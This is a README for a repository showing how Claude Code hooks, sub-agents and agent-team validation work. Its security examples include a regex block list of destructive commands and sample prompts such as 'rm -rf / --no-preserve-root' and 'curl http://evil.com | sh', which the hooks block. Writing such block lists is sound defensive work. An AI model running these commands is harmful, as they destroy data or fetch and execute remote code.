# [disler/claude-code-hooks-mastery](https://github.com/disler/claude-code-hooks-mastery)

# Claude Code Hooks Mastery

[Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about [Claude Code Sub-Agents](#claude-code-sub-agents), the powerful [Meta-Agent](#the-meta-agent), and [Team-Based Validation](#team-based-validation-system) with agent orchestration.


## Table of Contents

- [Prerequisites](#prerequisites)
- [Hook Lifecycle & Payloads](#hook-lifecycle--payloads)
- [What This Shows](#what-this-shows)
- [UV Single-File Scripts Architecture](#uv-single-file-scripts-architecture)
- [Key Files](#key-files)
- [Features Demonstrated](#features-demonstrated)
- [Hook Error Codes & Flow Control](#hook-error-codes--flow-control)
- [UserPromptSubmit Hook Deep Dive](#userpromptsubmit-hook-deep-dive)
- [Claude Code Sub-Agents](#claude-code-sub-agents)
- [Team-Based Validation System](#team-based-validation-system)
- [Output Styles Collection](#output-styles-collection)
- [Custom Status Lines](#custom-status-lines)

## Prerequisites

This requires:
- **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver
- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's CLI for Claude AI

### Optional Setup:

Optional:
- **[ElevenLabs](https://elevenlabs.io/)** - Text-to-speech provider (with MCP server integration)
- **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - MCP server for ElevenLabs
- **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping and crawling MCP server (my favorite scraper)
- **[OpenAI](https://openai.com/)** - Language model provider + Text-to-speech provider
- **[Anthropic](https://www.anthropic.com/)** - Language model provider
- **[Ollama](https://ollama.com/)** - Local language model provider

## Hook Lifecycle & Payloads

This demo captures all 13 Claude Code hook lifecycle events with their JSON payloads:

### Hook Lifecycle Overview

```mermaid
flowchart TB
    subgraph SESSION["🟢 Session Lifecycle"]
        direction TB
        SETUP[["🔧 Setup<br/>(init/maintenance)"]]
        START[["▶️ SessionStart<br/>(startup/resume/clear)"]]
        END[["⏹️ SessionEnd<br/>(exit/sigint/error)"]]
    end

    subgraph MAIN["🔄 Main Conversation Loop"]
        direction TB
        PROMPT[["📝 UserPromptSubmit"]]
        CLAUDE["Claude Processes"]

        subgraph TOOLS["🛠️ Tool Execution"]
            direction TB
            PRE[["🔒 PreToolUse"]]
            PERM[["❓ PermissionRequest"]]
            EXEC["Tool Executes"]
            POST[["✅ PostToolUse"]]
            FAIL[["❌ PostToolUseFailure"]]
        end

        subgraph SUBAGENT["🤖 Subagent Lifecycle"]
            direction TB
            SSTART[["🚀 SubagentStart"]]
            SWORK["Subagent Works"]
            SSTOP[["🏁 SubagentStop"]]
        end

        NOTIFY[["🔔 Notification<br/>(Async)"]]
        STOP[["🛑 Stop"]]
    end

    subgraph COMPACT["🗜️ Maintenance"]
        PRECOMPACT[["📦 PreCompact"]]
    end

    SETUP --> START
    START --> PROMPT
    PROMPT --> CLAUDE
    CLAUDE --> PRE
    PRE --> PERM
    PERM --> EXEC
    EXEC --> POST
    EXEC -.-> FAIL
    CLAUDE -.-> SSTART
    SSTART --> SWORK
    SWORK --> SSTOP
    POST --> CLAUDE
    CLAUDE --> STOP
    CLAUDE -.-> NOTIFY
    STOP --> PROMPT
    STOP -.-> END
    PROMPT -.-> PRECOMPACT
    PRECOMPACT -.-> PROMPT
```



### 1. UserPromptSubmit Hook
**Fires:** Immediately when user submits a prompt (before Claude processes it)  
**Payload:** `prompt` text, `session_id`, timestamp  
**Enhanced:** Prompt validation, logging, context injection, security filtering

### 2. PreToolUse Hook
**Fires:** Before any tool execution  
**Payload:** `tool_name`, `tool_input` parameters  
**Enhanced:** Blocks dangerous commands (`rm -rf`, `.env` access)

### 3. PostToolUse Hook  
**Fires:** After successful tool completion  
**Payload:** `tool_name`, `tool_input`, `tool_response` with results

### 4. Notification Hook
**Fires:** When Claude Code sends notifications (waiting for input, etc.)  
**Payload:** `message` content  
**Enhanced:** TTS alerts - "Your agent needs your input" (30% chance includes name)

### 5. Stop Hook
**Fires:** When Claude Code finishes responding  
**Payload:** `stop_hook_active` boolean flag  
**Enhanced:** AI-generated completion messages with TTS playback (LLM priority: OpenAI > Anthropic > Ollama > random)

### 6. SubagentStop Hook
**Fires:** When Claude Code subagents (Task tools) finish responding  
**Payload:** `stop_hook_active` boolean flag  
**Enhanced:** TTS playback - "Subagent Complete"

### 7. PreCompact Hook
**Fires:** Before Claude Code performs a compaction operation  
**Payload:** `trigger` ("manual" or "auto"), `custom_instructions` (for manual), session info  
**Enhanced:** Transcript backup, verbose feedback for manual compaction

### 8. SessionStart Hook
**Fires:** When Claude Code starts a new session or resumes an existing one
**Payload:** `source` ("startup", "resume", or "clear"), session info
**Enhanced:** Development context loading (git status, recent issues, context files)

### 9. SessionEnd Hook
**Fires:** When Claude Code session ends (exit, sigint, or error)
**Payload:** `session_id`, `transcript_path`, `cwd`, `permission_mode`, `reason`
**Enhanced:** Session logging with optional cleanup tasks (removes temp files, stale logs)

### 10. PermissionRequest Hook
**Fires:** When user is shown a permission dialog
**Payload:** `tool_name`, `tool_input`, `tool_use_id`, session info
**Enhanced:** Permission auditing, auto-allow for read-only ops (Read, Glob, Grep, safe Bash)

### 11. PostToolUseFailure Hook
**Fires:** When a tool execution fails
**Payload:** `tool_name`, `tool_input`, `tool_use_id`, `error` object
**Enhanced:** Structured error logging with timestamps and full context

### 12. SubagentStart Hook
**Fires:** When a subagent (Task tool) spawns
**Payload:** `agent_id`, `agent_type`, session info
**Enhanced:** Subagent spawn logging with optional TTS announcement

### 13. Setup Hook
**Fires:** When Claude enters a repository (init) or periodically (maintenance)
**Payload:** `trigger` ("init" or "maintenance"), session info
**Enhanced:** Environment persistence via `CLAUDE_ENV_FILE`, context injection via `additionalContext`


## What This Shows

- **Complete hook lifecycle coverage** - All 13 hook events implemented and logging (11/13 validated via automated testing)
- **Prompt-level control** - UserPromptSubmit validates and enhances prompts before Claude sees them
- **Intelligent TTS system** - AI-generated audio feedback with voice priority (ElevenLabs > OpenAI > pyttsx3)
- **Security enhancements** - Blocks dangerous commands and sensitive file access at multiple levels
- **Personalized experience** - Uses engineer name from environment variables
- **Automatic logging** - All hook events are logged as JSON to `logs/` directory
- **Chat transcript extraction** - PostToolUse hook converts JSONL transcripts to readable JSON format
- **Team-based validation** - Builder/Validator agent pattern with code quality hooks

> **Warning:** The `chat.json` file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.

## UV Single-File Scripts Architecture

This project leverages **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** to keep hook logic cleanly separated from your main codebase. All hooks live in `.claude/hooks/` as standalone Python scripts with embedded dependency declarations.

**Benefits:**
- **Isolation** - Hook logic stays separate from your project dependencies
- **Portability** - Each hook script declares its own dependencies inline
- **No Virtual Environment Management** - UV handles dependencies automatically
- **Fast Execution** - UV's dependency resolution is lightning-fast
- **Self-Contained** - Each hook can be understood and modified independently

This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.

## Key Files

- `.claude/settings.json` - Hook configuration with permissions
- `.claude/hooks/` - Python scripts using uv for each hook type
  - `user_prompt_submit.py` - Prompt validation, logging, and context injection
  - `pre_tool_use.py` - Security blocking and logging
  - `post_tool_use.py` - Logging and transcript conversion
  - `post_tool_use_failure.py` - Error logging with structured details
  - `notification.py` - Logging with optional TTS (--notify flag)
  - `stop.py` - AI-generated completion messages with TTS
  - `subagent_stop.py` - Simple "Subagent Complete" TTS
  - `subagent_start.py` - Subagent spawn logging with optional TTS
  - `pre_compact.py` - Transcript backup and compaction logging
  - `session_start.py` - Development context loading and session logging
  - `session_end.py` - Session cleanup and logging
  - `permission_request.py` - Permission auditing and auto-allow
  - `setup.py` - Repository initialization and maintenance
  - `validators/` - Code quality validation hooks
    - `ruff_validator.py` - Python linting via Ruff (PostToolUse)
    - `ty_validator.py` - Python type checking (PostToolUse)
  - `utils/` - Intelligent TTS and LLM utility scripts
    - `tts/` - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3)
      - `tts_queue.py` - Queue-based TTS management (prevents overlapping audio)
    - `llm/` - Language model integrations (OpenAI, Anthropic, Ollama)
      - `task_summarizer.py` - LLM-powered task completion summaries
- `.claude/status_lines/` - Real-time terminal status displays
  - `status_line.py` - Basic MVP with git info
  - `status_line_v2.py` - Smart prompts with color coding
  - `status_line_v3.py` - Agent sessions with history
  - `status_line_v4.py` - Extended metadata support
  - `status_line_v5.py` - Cost tracking with line changes
  - `status_line_v6.py` - Context window usage bar
  - `status_line_v7.py` - Session duration timer
  - `status_line_v8.py` - Token usage with cache stats
  - `status_line_v9.py` - Minimal powerline style
- `.claude/output-styles/` - Response formatting configurations
  - `genui.md` - Generates beautiful HTML with embedded styling
  - `table-based.md` - Organizes information in markdown tables
  - `yaml-structured.md` - YAML configuration format
  - `bullet-points.md` - Clean nested lists
  - `ultra-concise.md` - Minimal words, maximum speed
  - `html-structured.md` - Semantic HTML5
  - `markdown-focused.md` - Rich markdown features
  - `tts-summary.md` - Audio feedback via TTS
- `.claude/commands/` - Custom slash commands
  - `prime.md` - Project analysis and understanding
  - `plan_w_team.md` - Team-based build/validate workflow
  - `crypto_research.md` - Cryptocurrency research workflows
  - `cook.md` - Advanced task execution
  - `update_status_line.md` - Dynamic status updates
- `.claude/agents/` - Sub-agent configurations
  - `crypto/` - Cryptocurrency analysis agents
  - `team/` - Team-based workflow agents
    - `builder.md` - Implementation agent (all tools)
    - `validator.md` - Read-only validation agent
  - `hello-world-agent.md` - Simple greeting example
  - `llm-ai-agents-and-eng-research.md` - AI research specialist
  - `meta-agent.md` - Agent that creates other agents
  - `work-completion-summary.md` - Audio summary generator
- `logs/` - JSON logs of all hook executions
  - `user_prompt_submit.json` - User prompt submissions with validation
  - `pre_tool_use.json` - Tool use events with security blocking
  - `post_tool_use.json` - Tool completion events
  - `post_tool_use_failure.json` - Tool failure events with error details
  - `notification.json` - Notification events
  - `stop.json` - Stop events with completion messages
  - `subagent_stop.json` - Subagent completion events
  - `subagent_start.json` - Subagent spawn events
  - `pre_compact.json` - Pre-compaction events with trigger type
  - `session_start.json` - Session start events with source type
  - `session_end.json` - Session end events with reason
  - `permission_request.json` - Permission request audit log
  - `setup.json` - Setup events with trigger type
  - `chat.json` - Readable conversation transcript (generated by --chat flag)
- `ai_docs/` - Documentation resources
  - `cc_hooks_docs.md` - Complete hooks documentation from Anthropic
  - `claude_code_status_lines_docs.md` - Status line input schema and configuration
  - `user_prompt_submit_hook.md` - Comprehensive UserPromptSubmit hook documentation
  - `uv-single-file-scripts.md` - UV script architecture documentation
  - `anthropic_custom_slash_commands.md` - Slash commands documentation
  - `anthropic_docs_subagents.md` - Sub-agents documentation
- `ruff.toml` - Ruff linter configuration for Python code quality
- `ty.toml` - Type checker configuration for Python type validation

Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.

## Features Demonstrated

- Prompt validation and security filtering
- Context injection for enhanced AI responses
- Command logging and auditing
- Automatic transcript conversion  
- Permission-based tool access control
- Error handling in hook execution

Run any Claude Code command to see hooks in action via the `logs/` files.

## Hook Error Codes & Flow Control

Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.

### Exit Code Behavior

Hooks communicate status and control flow through exit codes:

| Exit Code | Behavior           | Description                                                                                  |
| --------- | ------------------ | -------------------------------------------------------------------------------------------- |
| **0**     | Success            | Hook executed successfully. `stdout` shown to user in transcript mode (Ctrl-R)               |
| **2**     | Blocking Error     | **Critical**: `stderr` is fed back to Claude automatically. See hook-specific behavior below |
| **Other** | Non-blocking Error | `stderr` shown to user, execution continues normally                                         |

### Hook-Specific Flow Control

Each hook type has different capabilities for blocking and controlling Claude Code's behavior:

#### UserPromptSubmit Hook - **CAN BLOCK PROMPTS & ADD CONTEXT**
- **Primary Control Point**: Intercepts user prompts before Claude processes them
- **Exit Code 2 Behavior**: Blocks the prompt entirely, shows error message to user
- **Use Cases**: Prompt validation, security filtering, context injection, audit logging
- **Example**: Our `user_prompt_submit.py` logs all prompts and can validate them

#### PreToolUse Hook - **CAN BLOCK TOOL EXECUTION**
- **Primary Control Point**: Intercepts tool calls before they execute
- **Exit Code 2 Behavior**: Blocks the tool call entirely, shows error message to Claude
- **Use Cases**: Security validation, parameter checking, dangerous command prevention
- **Example**: Our `pre_tool_use.py` blocks `rm -rf` commands with exit code 2

```python
# Block dangerous commands
if is_dangerous_rm_command(command):
    print("BLOCKED: Dangerous rm command detected", file=sys.stderr)
    sys.exit(2)  # Blocks tool call, shows error to Claude
```

#### PostToolUse Hook - **CANNOT BLOCK (Tool Already Executed)**
- **Primary Control Point**: Provides feedback after tool completion
- **Exit Code 2 Behavior**: Shows error to Claude (tool already ran, cannot be undone)
- **Use Cases**: Validation of results, formatting, cleanup, logging
- **Limitation**: Cannot prevent tool execution since it fires after completion

#### Notification Hook - **CANNOT BLOCK**
- **Primary Control Point**: Handles Claude Code notifications
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Custom notifications, logging, user alerts
- **Limitation**: Cannot control Claude Code behavior, purely informational

#### Stop Hook - **CAN BLOCK STOPPING**
- **Primary Control Point**: Intercepts when Claude Code tries to finish responding
- **Exit Code 2 Behavior**: Blocks stoppage, shows error to Claude (forces continuation)
- **Use Cases**: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION
- **Caution**: Can cause infinite loops if not properly controlled

#### SubagentStop Hook - **CAN BLOCK SUBAGENT STOPPING**
- **Primary Control Point**: Intercepts when Claude Code subagents try to finish
- **Exit Code 2 Behavior**: Blocks subagent stoppage, shows error to subagent
- **Use Cases**: Ensuring subagent tasks complete properly
- **Example**: Our `subagent_stop.py` logs events and announces completion

#### PreCompact Hook - **CANNOT BLOCK**
- **Primary Control Point**: Fires before compaction operations
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Transcript backup, context preservation, pre-compaction logging
- **Example**: Our `pre_compact.py` creates transcript backups before compaction

#### SessionStart Hook - **CANNOT BLOCK**
- **Primary Control Point**: Fires when new sessions start or resume
- **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability
- **Use Cases**: Loading development context, session initialization, environment setup
- **Example**: Our `session_start.py` loads git status, recent issues, and context files

### Advanced JSON Output Control

Beyond simple exit codes, hooks can return structured JSON for sophisticated control:

#### Common JSON Fields (All Hook Types)
```json
{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
```

#### PreToolUse Decision Control
```json
{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"approve"**: Bypasses permission system, `reason` shown to user
- **"block"**: Prevents tool execution, `reason` shown to Claude
- **undefined**: Normal permission flow, `reason` ignored

#### PostToolUse Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"block"**: Automatically prompts Claude with `reason`
- **undefined**: No action, `reason` ignored

#### Stop Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
```

- **"block"**: Prevents Claude from stopping, `reason` tells Claude how to proceed
- **undefined**: Allows normal stopping, `reason` ignored

### Flow Control Priority

When multiple control mechanisms are used, they follow this priority:

1. **`"continue": false`** - Takes precedence over all other controls
2. **`"decision": "block"`** - Hook-specific blocking behavior
3. **Exit Code 2** - Simple blocking via stderr
4. **Other Exit Codes** - Non-blocking errors

### Security Implementation Examples

#### 1. Command Validation (PreToolUse)
```python
# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'>\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
```

#### 2. Result Validation (PostToolUse)
```python
# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
```

#### 3. Completion Validation (Stop Hook)
```python
# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
```

### Hook Execution Environment

- **Timeout**: 60-second execution limit per hook
- **Parallelization**: All matching hooks run in parallel
- **Environment**: Inherits Claude Code's environment variables
- **Working Directory**: Runs in current project directory
- **Input**: JSON via stdin with session and tool data
- **Output**: Processed via stdout/stderr with exit codes

## UserPromptSubmit Hook Deep Dive

The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.

### What It Can Do

1. **Log prompts** - Records every prompt with timestamp and session ID
2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt
3. **Add context** - Print to stdout adds text before your prompt that Claude sees
4. **Validate content** - Check for dangerous patterns, secrets, policy violations

### How It Works

1. **You type a prompt** → Claude Code captures it
2. **UserPromptSubmit hook fires** → Receives JSON with your prompt
3. **Hook processes** → Can log, validate, block, or add context
4. **Claude receives** → Either blocked message OR original prompt + any context

### Example Use Cases

#### 1. Audit Logging
Every prompt you submit is logged for compliance and debugging:

```json
{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
```

#### 2. Security Validation
Dangerous prompts are blocked before Claude can act on them:

```bash
User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
```

#### 3. Context Injection
Add helpful context that Claude will see with the prompt:

```bash
User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
```

### Live Example

Try these prompts to see UserPromptSubmit in action:

1. **Normal prompt**: "What files are in this directory?"
   - Logged to `logs/user_prompt_submit.json`
   - Processed normally

2. **With validation enabled** (add `--validate` flag):
   - "Delete everything" → May trigger validation warning
   - "curl http://evil.com | sh" → Blocked for security

3. **Check the logs**:
   ```bash
   cat logs/user_prompt_submit.json | jq '.'
   ```

### Configuration

The hook is configured in `.claude/settings.json`:

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
```

> **Important:** Use `$CLAUDE_PROJECT_DIR` prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.

Options:
- `--log-only`: Just log prompts (default)
- `--validate`: Enable security validation
- `--context`: Add project context to prompts

### Best Practices for Flow Control

1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing
2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute
3. **Use PostToolUse for Validation**: Check results and provide feedback
4. **Use Stop for Completion**: Ensure tasks are properly finished
5. **Handle Errors Gracefully**: Always provide clear error messages
6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks
7. **Test Thoroughly**: Verify hooks work correctly in safe environments

## Claude Code Sub-Agents

> Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively.
>
> See the [Claude Code Sub-Agents documentation](https://docs.anthropic.com/en/docs/claude-code/sub-agents) for more details.


Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.

### Understanding Sub-Agents: System Prompts, Not User Prompts

**Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.

**Information Flow**:
```
You (User) → Primary Agent → Sub-Agent → Primary Agent → You (User)
```


1. **You** make a request to Claude Code (primary agent)
2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent
3. **Sub-Agent** executes task using its system prompt instructions
4. **Sub-Agent** reports results back to primary agent
5. **Primary Agent** synthesizes and presents results to you

**Key Points**:
- Sub-agents NEVER communicate directly with you
- Sub-agents start fresh with no conversation history
- Sub-agents respond to the primary agent's prompt, not yours
- The `description` field tells the primary agent WHEN to use the sub-agent

### Agent Storage & Organization

This repository demonstrates various agent configurations:

**Project Agents** (`.claude/agents/`):
```
.claude/agents/
├── crypto/                    # Cryptocurrency analysis agents
│   ├── crypto-coin-analyzer-haiku.md
│   ├── crypto-coin-analyzer-opus.md
│   ├── crypto-coin-analyzer-sonnet.md
│   ├── crypto-investment-plays-*.md
│   ├── crypto-market-agent-*.md
│   ├── crypto-movers-haiku.md
│   └── macro-crypto-correlation-scanner-*.md
├── hello-world-agent.md       # Simple greeting agent
├── llm-ai-agents-and-eng-research.md  # AI research specialist
├── meta-agent.md              # Agent that creates agents
└── work-completion-summary.md # Audio summary generator
```

**Storage Hierarchy**:
- **Project agents**: `.claude/agents/` (higher priority, project-specific)
- **User agents**: `~/.claude/agents/` (lower priority, available across all projects)
- **Format**: Markdown files with YAML frontmatter

**Agent File Structure:**
```yaml
---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
```

Sub-agents enable:
- **Task specialization** - Code reviewers, debuggers, test runners
- **Context preservation** - Each agent operates independently  
- **Tool restrictions** - Grant only necessary permissions
- **Automatic delegation** - Claude proactively uses the right agent

### Key Engineering Insights

**Two Critical Mistakes to Avoid:**

1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent.

2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.

**Best Practices:**
- Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents
- Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions
- Remember sub-agents start fresh with no context - be explicit about what they need to know
- Follow Problem → Solution → Technology approach when building agents

### Complex Workflows & Agent Chaining

Claude Code can intelligently chain multiple sub-agents together for complex tasks:


For example:
- "First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"
- "Use the debugger agent to fix errors, then have the code-reviewer check the changes"
- "Generate a new agent with meta-agent, then test it on a specific task"

This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.

### The Meta-Agent

The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.

**Why Meta-Agent Matters:**
- **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours
- **Consistent Structure** - Ensures all agents follow best practices and proper formatting
- **Live Documentation** - Pulls latest Claude Code docs to stay current with features
- **Intelligent Tool Selection** - Automatically determines minimal tool requirements

**Using the Meta-Agent:**
```bash
# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
```

The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.

## Team-Based Validation System

> **Watch the walkthrough:** See agent teams and the `/plan_w_team` workflow in action at [https://youtu.be/4_2j5wgt_ds](https://youtu.be/4_2j5wgt_ds)


This repository includes a powerful build/validate workflow pattern using the Claude Code task system to orchestrate specialized agent teams.

### The `/plan_w_team` Meta Prompt

The `/plan_w_team` command (`.claude/commands/plan_w_team.md`) is not an ordinary prompt—it has three powerful components:

#### 1. Self-Validating

The prompt includes embedded hooks in its front matter that validate its own output:

```yaml
hooks:
  stop:
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_new_file.py specs/*.md"
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_file_contains.py"
```

After the planning agent finishes, these validators ensure:
- A spec file was created in the correct directory
- The file contains required sections (team orchestration, step-by-step tasks, etc.)

If validation fails, the agent receives feedback and continues working until the output meets criteria.

#### 2. Agent Orchestration

The prompt leverages Claude Code's task system to build and coordinate agent teams:

| Task Tool    | Purpose                                                  |
| ------------ | -------------------------------------------------------- |
| `TaskCreate` | Create new tasks with owners, descriptions, dependencies |
| `TaskUpdate` | Update status, add blockers, communicate completion      |
| `TaskList`   | View all tasks and their current state                   |
| `TaskGet`    | Retrieve full task details                               |

**How it works:**
1. Primary agent creates a task list with specific owners (builder/validator)
2. Tasks can run in parallel or have dependency blockers
3. Subagents complete work and ping back to the primary agent
4. Primary agent reacts in real-time as work completes
5. Blocked tasks automatically unblock when dependencies finish

This enables longer-running threads of work because the task system handles coordination—no bash sleep loops needed.

#### 3. Templating

`/plan_w_team` is a **template meta prompt**—a prompt that generates prompts in a specific, vetted format:

```markdown
## Plan Format (embedded in the meta prompt)

### {{PLAN_NAME}}
**Task:** {{TASK_DESCRIPTION}}
**Objective:** {{OBJECTIVE}}

### Team Orchestration
{{TEAM_MEMBERS}}

### Step-by-Step Tasks
{{TASKS}}
```

The generated plan follows your engineering patterns exactly. This is the difference between agentic engineering and "vibe coding"—you know the outcome your agent will generate because you've templated the format.

### Team Agents

| Agent         | File                | Tools                     | Self-Validation        | Purpose                                         |
| ------------- | ------------------- | ------------------------- | ---------------------- | ----------------------------------------------- |
| **Builder**   | `team/builder.md`   | All tools                 | Ruff + Ty on .py files | Execute implementation tasks, build the thing   |
| **Validator** | `team/validator.md` | Read-only (no Write/Edit) | None                   | Verify builder's work meets acceptance criteria |

This two-agent pairing increases compute to increase trust that work was delivered correctly.

### Code Quality Validators

PostToolUse validators automatically enforce code quality:

| Validator | File                | Trigger                 | Action                |
| --------- | ------------------- | ----------------------- | --------------------- |
| **Ruff**  | `ruff_validator.py` | Write/Edit on .py files | Blocks on lint errors |
| **Ty**    | `ty_validator.py`   | Write/Edit on .py files | Blocks on type errors |

### Workflow Example

```bash
# 1. Create a plan with team orchestration
/plan_w_team

# User prompt: "Update the hooks documentation and add missing status lines"
# Orchestration prompt: "Create groups of agents for each hook, one builder and one validator"

# 2. Plan is generated with:
#    - Team members (session_end_builder, session_end_validator, etc.)
#    - Step-by-step tasks with dependencies
#    - Validation commands

# 3. Execute the plan
/build

# 4. Watch agents work in parallel:
#    - Builders implement features
#    - Validators verify completion
#    - Task system coordinates everything
```

### Configuration

- `ruff.toml` - Ruff linter rules
- `ty.toml` - Type checker settings
- `.claude/agents/team/` - Team agent definitions

## Output Styles Collection

> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)


This project includes a comprehensive collection of custom output styles (`.claude/output-styles/`) that transform how Claude Code communicates responses. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/output-styles) for complete details on how output styles work.

| Style                | Description                                        | Best For                                                |
| -------------------- | -------------------------------------------------- | ------------------------------------------------------- |
| **genui** ⭐          | **Generates beautiful HTML with embedded styling** | **Interactive visual outputs, instant browser preview** |
| **table-based**      | Organizes all information in markdown tables       | Comparisons, structured data, status reports            |
| **yaml-structured**  | Formats responses as YAML configuration            | Settings, hierarchical data, API responses              |
| **bullet-points**    | Clean nested lists with dashes and numbers         | Action items, documentation, task tracking              |
| **ultra-concise**    | Minimal words, maximum speed                       | Experienced devs, rapid prototyping                     |
| **html-structured**  | Semantic HTML5 with data attributes                | Web documentation, rich formatting                      |
| **markdown-focused** | Leverages all markdown features optimally          | Complex documentation, mixed content                    |
| **tts-summary**      | Announces task completion via ElevenLabs TTS       | Audio feedback, accessibility                           |

**Usage:** Run `/output-style [name]` to activate any style (e.g., `/output-style table-based`)

**Location:** 
- Project styles: `.claude/output-styles/*.md` (this repo)
- User styles: `~/.claude/output-styles/*.md` (global)

Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.


## Custom Status Lines

> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)

This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/statusline) for complete details.

### Available Status Lines

**Location:** `.claude/status_lines/`

| Version | File                | Description       | Features                                                        |
| ------- | ------------------- | ----------------- | --------------------------------------------------------------- |
| **v1**  | `status_line.py`    | Basic MVP         | Git branch, directory, model info                               |
| **v2**  | `status_line_v2.py` | Smart prompts     | Latest prompt (250 chars), color-coded by task type             |
| **v3**  | `status_line_v3.py` | Agent sessions    | Agent name, model, last 3 prompts                               |
| **v4**  | `status_line_v4.py` | Extended metadata | Agent name, model, latest prompt, custom key-value pairs        |
| **v5**  | `status_line_v5.py` | Cost tracking     | Model, cost ($), line changes (+/-), session duration           |
| **v6**  | `status_line_v6.py` | Context window    | Visual usage bar, percentage, tokens remaining                  |
| **v7**  | `status_line_v7.py` | Duration timer    | Session time, start time, optional end time                     |
| **v8**  | `status_line_v8.py` | Token/cache stats | Input/output tokens, cache creation/read stats                  |
| **v9**  | `status_line_v9.py` | Powerline minimal | Stylized segments with powerline separators, git branch, % used |

### Session Management

